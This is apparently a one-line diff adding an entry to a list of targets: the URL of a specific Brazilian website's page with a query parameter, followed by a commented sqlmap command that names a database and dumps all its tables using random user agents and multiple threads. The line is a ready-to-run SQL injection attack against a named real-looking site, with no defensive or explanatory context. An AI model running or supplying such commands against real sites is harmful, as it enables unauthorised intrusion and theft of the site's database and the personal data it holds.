@@ -1,0 +1,1 @@
+https://www.centerkart.com.br/servico.php?servico=1 (GET)  # sqlmap.py -u https://www.centerkart.com.br/servico.php?servico=1 -D centerkart02 --threads 5 -v3 --random-agent --tables --dump-all
